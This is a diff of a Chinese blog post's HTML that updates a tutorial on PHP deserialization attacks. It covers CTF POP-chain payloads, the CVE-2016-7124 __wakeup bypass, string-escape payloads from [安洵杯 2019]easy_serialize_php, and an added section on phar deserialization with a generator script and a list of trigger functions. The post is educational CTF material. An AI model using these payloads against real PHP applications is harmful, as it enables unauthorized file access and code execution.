@@ -16,21 +16,22 @@
   <meta name="author" content="pikaball">
   <meta name="keywords" content="">
   
-    <meta name="description" content="前置知识序列化与反序列化所谓序列化是将一个对象（标量、数组或自定义类）转化为统一的字符串形式，反序列化函数接收这个字符串可以还原出这个对象。 序列化的内容只是对象的成员变量的值，不能做到把类内方法也打包，换句话说，序列化是存储一个已经定义的类的实例，而不是类本身。做反序列化操作时要求这个类必须已经有定义，然后反序列化函数将把成员变量的值填充到类的一个实例并返回这个实例。 一个简单的例子： &lt;">
+    <meta name="description" content="前置知识序列化与反序列化所谓序列化是将一个对象转化为统一的字符串形式，反序列化函数接收这个字符串可以还原出这个对象。 序列化的内容只是对象的成员变量的值，不能做到把类内方法也打包，换句话说，序列化是存储一个已经定义的类的实例，而不是类本身。做反序列化操作时要求这个类必须已经有定义，然后反序列化函数将把成员变量的值填充到类的一个实例并返回这个实例。 一个简单的例子： &lt;?php class p">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP反序列化漏洞整理">
 <meta property="og:url" content="http://pikaball.cc/2023/07/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/index.html">
 <meta property="og:site_name" content="pikaball&#39;s blog">
-<meta property="og:description" content="前置知识序列化与反序列化所谓序列化是将一个对象（标量、数组或自定义类）转化为统一的字符串形式，反序列化函数接收这个字符串可以还原出这个对象。 序列化的内容只是对象的成员变量的值，不能做到把类内方法也打包，换句话说，序列化是存储一个已经定义的类的实例，而不是类本身。做反序列化操作时要求这个类必须已经有定义，然后反序列化函数将把成员变量的值填充到类的一个实例并返回这个实例。 一个简单的例子： &lt;">
+<meta property="og:description" content="前置知识序列化与反序列化所谓序列化是将一个对象转化为统一的字符串形式，反序列化函数接收这个字符串可以还原出这个对象。 序列化的内容只是对象的成员变量的值，不能做到把类内方法也打包，换句话说，序列化是存储一个已经定义的类的实例，而不是类本身。做反序列化操作时要求这个类必须已经有定义，然后反序列化函数将把成员变量的值填充到类的一个实例并返回这个实例。 一个简单的例子： &lt;?php class p">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/06/13/d6a2f81e89c9b1f3.jpg">
+<meta property="og:image" content="http://pikaball.cc/post.jpg">
+<meta property="og:image" content="http://pikaball.cc/phar.jpg">
 <meta property="article:published_time" content="2023-07-18T10:37:40.000Z">
-<meta property="article:modified_time" content="2023-08-25T14:57:47.660Z">
+<meta property="article:modified_time" content="2023-08-28T12:10:30.734Z">
 <meta property="article:author" content="pikaball">
 <meta property="article:tag" content="PHP">
 <meta property="article:tag" content="反序列化">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://s3.bmp.ovh/imgs/2023/06/13/d6a2f81e89c9b1f3.jpg">
+<meta name="twitter:image" content="http://pikaball.cc/post.jpg">
   
   
   
@@ -223,7 +224,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          12k 字
+          13k 字
         
       </span>
     
@@ -234,7 +235,7 @@
         
         
         
-          97 分钟
+          108 分钟
         
       </span>
     
@@ -276,7 +277,7 @@
             
               <div class="markdown-body">
                 
-                <h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>所谓序列化是将一个对象（标量、数组或自定义类）转化为统一的字符串形式，反序列化函数接收这个字符串可以还原出这个对象。</p>
+                <h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>所谓序列化是将一个对象转化为统一的字符串形式，反序列化函数接收这个字符串可以还原出这个对象。</p>
 <p>序列化的内容只是对象的成员变量的值，不能做到把类内方法也打包，换句话说，序列化是存储一个已经定义的类的实例，而不是类本身。做反序列化操作时要求这个类必须已经有定义，然后反序列化函数将把成员变量的值填充到类的一个实例并返回这个实例。</p>
 <p>一个简单的例子：</p>
 <div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
@@ -502,13 +503,14 @@
 <span class="hljs-variable">$un</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;‮⁦快给我传参⁩⁦pop&#x27;</span>]); <span class="hljs-comment">//</span>
 <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;seino&#x27;</span>);</code></pre></div>
 
-<p>这题有个恶心的地方就是post参数名包含特殊控制字符，看起来名字是pop，实际上长这样：<br><img src="https://s3.bmp.ovh/imgs/2023/06/13/d6a2f81e89c9b1f3.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>先不管这个，来分析一下pop链怎么构造，先找头和尾：</p>
+<p>这题有个恶心的地方就是post参数名包含特殊控制字符，看起来名字是pop，实际上长这样：</p>
+<p><img src="/post.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>pop链构造：</p>
 <ul>
-<li>最终目的是执行dark类的getFlag()方法，include(“\flag”)，那个hacked函数过滤拿url编码绕一下就行，毫无障碍。</li>
+<li>最终目的是执行dark类的getFlag()方法，include(“\flag”)，那个hacked函数里的过滤拿url编码绕一下就行。</li>
 <li>代码只做了一个unserialize，又没有__wakeup()，入口只能是night类的__destruct()方法，在对象销毁时调用。</li>
 </ul>
-<p>之后就是顺藤摸瓜，比如要调用dark类的getFlag()，发现在day类的__call方法里出现getFlag()，那就把day类对象的成员变量$day赋值为一个dark类。然后再去找哪里可以触发__call()，从下往上一路摸到night类的__destruct里面就完事了。</p>
+<p>之后就是顺藤摸瓜，比如要调用dark类的getFlag()，发现在day类的__call方法里出现getFlag()，那就把day类对象的成员变量$day赋值为一个dark类。然后再去找哪里可以触发__call()，从下往上一路摸到night类的__destruct.</p>
 <p>pop链构造：</p>
 <div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">night</span>();
 <span class="hljs-variable">$a</span>-&gt;night = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">day</span>();
@@ -529,7 +531,7 @@
 <p>拿到上面的输出，手动把数组第二项null的索引<code>i:1</code>改成<code>i:0</code>:</p>
 <p><code>a:2:&#123;i:0;O:5:&quot;night&quot;:1:&#123;s:5:&quot;night&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;O:5:&quot;light&quot;:1:&#123;s:5:&quot;light&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;s:7:&quot;%2Fflag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;i:0;N;&#125;</code></p>
 <p>这样在反序列化执行的时候，把索引为0的数组元素覆盖成了null，完成主动销毁。</p>
-<h1 id="CVE-2016-7124漏洞"><a href="#CVE-2016-7124漏洞" class="headerlink" title="CVE-2016-7124漏洞"></a>CVE-2016-7124漏洞</h1><p><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7124">CVE-2016-7124</a>可以绕过反序列化时__wakeup()方法的执行，此漏洞有效的php版本：PHP before 5.6.25 and 7.x before 7.0.10</p>
+<h1 id="Trick-绕过-wakeup"><a href="#Trick-绕过-wakeup" class="headerlink" title="Trick:绕过__wakeup()"></a>Trick:绕过__wakeup()</h1><h2 id="CVE-2016-7124漏洞"><a href="#CVE-2016-7124漏洞" class="headerlink" title="CVE-2016-7124漏洞"></a>CVE-2016-7124漏洞</h2><p><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7124">CVE-2016-7124</a>可以绕过反序列化时__wakeup()方法的执行，此漏洞有效的php版本：PHP before 5.6.25 and 7.x before 7.0.10</p>
 <p>具体利用方法：当反序列化字符串O:标记后跟的属性个数大于实际个数，则会跳过__wakeup()。</p>
 <p>测试发现php5和php7的表现不一样，下面做简单展示。</p>
 <p>写一个测试脚本:</p>
@@ -571,7 +573,9 @@
 <p>传入：<code>O:4:&quot;pika&quot;:2:&#123;s:4:&quot;var&quot;;s:2:&quot;01&quot;;s:1:&quot;q&quot;;N;&#125;</code></p>
 <p>这里”var”的长度本来声明是3，改成了4</p>
 <p>输出：<code>destruct pika_00</code>，在php5和php7下表现一致。</p>
-<p>猜测这个特性的有效范围与CVE-2016-7124一致，不在此范围的php版本下直接报错退出了。</p>
+<p>猜测这个特性的有效范围与CVE-2016-7124一致。</p>
+<h2 id="利用不带属性的C-标识"><a href="#利用不带属性的C-标识" class="headerlink" title="利用不带属性的C:标识"></a>利用不带属性的C:标识</h2><p>参阅：<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=81151">https://bugs.php.net/bug.php?id=81151</a></p>
+<p>这个方法应该是各种版本通用的，但是有限制，无法主动操纵对象的属性。</p>
 <h1 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h1><p>情境：序列化之后进行过滤再反序列化。</p>
 <h2 id="字符增多"><a href="#字符增多" class="headerlink" title="字符增多"></a>字符增多</h2><p>例如：</p>
 <div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
@@ -614,7 +618,7 @@
 <p>过滤后：</p>
 <div class="code-wrapper"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">144</span>:<span class="hljs-string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;&#125;<span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:8:&quot;</span>show.jpg<span class="hljs-string">&quot;;&#125;</span></code></pre></div>
 
-<p>字符串变量在进行反序列化时依据标明的长度进行截取，而不会去看双引号的匹配情况，这是字符逃逸能发生的主要原因。此外，当最外层的花括号完成闭合之后，后面的字符串会被直接忽略。</p>
+<p>字符串变量在进行反序列化时依据标明的长度进行截取，而不会去看双引号的匹配情况，只要截取内容前后被双引号包裹即合法，这是字符逃逸能发生的主要原因。此外，当最外层的花括号完成闭合之后，后面的字符串会被直接忽略。</p>
 <p>where的个数是24个，即<code>&quot;;s:3:&quot;img&quot;;s:4:&quot;flag&quot;;&#125;</code>的长度，在过滤后，每个where变成hacker使得总长度加一。过滤之后144个字符的位置恰好包含了24个hacker，而之后的恶意字符串被挤出去进行解析，完成了序列化字符串的闭合，img的值被修改为<code>flag</code>.</p>
 <h2 id="字符减少"><a href="#字符减少" class="headerlink" title="字符减少"></a>字符减少</h2><h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
@@ -673,13 +677,92 @@ Content-Length: 66
 _SESSION[phpflag]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></pre></div>
 
 <p>增添了一个键值对<code>phpflag</code>，序列化之后：</p>
-<div class="code-wrapper"><pre><code class="hljs php">a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;guest&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;function&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;show_image&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpflag&quot;</span>;s:<span class="hljs-number">48</span>:<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="hljs-string">&quot;;&#125;&quot;</span>s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</code></pre></div>
-
+<p><code>a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code></p>
 <p>过滤后：</p>
-<div class="code-wrapper"><pre><code class="hljs php">a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;guest&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;function&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;show_image&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">48</span>:<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="hljs-string">&quot;;&#125;&quot;</span>s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</code></pre></div>
-
+<p><code>a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code></p>
 <p>filter将使<code>phpflag</code>被替换为空字符，而<code>s:7:&quot;</code>这个位置将会吞掉原本的结构字符串<code>&quot;;s:48:</code>。即键值对<code>phpflag</code>-&gt;<code>[48]</code>被换成了<code>&quot;;s:48:</code>-&gt;<code>1</code>，之后的恶意字符串成功逃逸，被unserialize解析。</p>
+<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><p>详见：<a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p>
+<p>phar文件是一种压缩文件，在使用phar:&#x2F;&#x2F;协议解析时会对其meta-data部分进行反序列化，从而在没有可以利用的unserialize函数时提供反序列化入口。</p>
+<p>一般需要能上传文件。</p>
+<h2 id="phar文件格式"><a href="#phar文件格式" class="headerlink" title="phar文件格式"></a>phar文件格式</h2><p>phar文件可以分为四个部分。</p>
+<ul>
+<li><strong>a stub</strong>.格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，必须以<code>__HALT_COMPILER();?&gt;</code>结尾用以识别。</li>
+<li><strong>a manifest describing the contents</strong>.存储压缩文件信息，包含用户自定义的meta-data.</li>
+<li>被压缩文件内容</li>
+<li>签名</li>
+</ul>
+<p>php生成phar文件示例：</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pika</span> </span>&#123;
+        <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span>=<span class="hljs-number">1</span>;
+    &#125;
 
+    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">pika</span>();
+
+    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;cmd.phar&quot;</span>);
+    <span class="hljs-variable">$generator</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;cmd.phar&quot;</span>);
+    <span class="hljs-variable">$generator</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();
+    <span class="hljs-variable">$generator</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);
+    <span class="hljs-variable">$generator</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);
+    <span class="hljs-variable">$generator</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;cmd.txt&quot;</span>,<span class="hljs-string">&quot;hacker&quot;</span>);
+    <span class="hljs-variable">$generator</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();
+<span class="hljs-meta">?&gt;</span>
+</code></pre></div>
+
+<p><img src="/phar.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>测试脚本：</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pika</span> </span>&#123;
+        <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span>=<span class="hljs-number">0</span>;
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;destruct.flag=&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;flag;
+        &#125;
+    &#125;
+
+    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Exist.&quot;</span>;
+    &#125;
+    <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not exist.&quot;</span>;
+    &#125;</code></pre></div>
+
+<p>访问：<code>?file=phar://cmd.phar</code></p>
+<p>输出：<code>Exist.destruct.flag=1</code></p>
+<p>可以触发phar反序列化的函数：</p>
+<table>
+<tr>
+<td>fileatime</td>
+<td>filectime</td>
+<td>file_exists</td>
+<td>file_get_contents</td>
+<td>file_put_contents</td>
+<td>file</td>
+</tr>
+<tr>
+<td>filegroup</td>
+<td>fopen</td>
+<td>fileinode</td>
+<td>filemtime</td>
+<td>fileowner</td>
+<td>fileperms</td>
+</tr>
+<tr>
+<td>is_dir</td>
+<td>is_executable</td>
+<td>is_file</td>
+<td>is_link</td>
+<td>is_readable</td>
+<td>is_writable</td>
+</tr>
+<tr>
+<td>is_writeable</td>
+<td>parse_ini_file</td>
+<td>copy</td>
+<td>unlink</td>
+<td>stat</td>
+<td>readfile</td>
+</tr>
+</table>
                 
               </div>
             
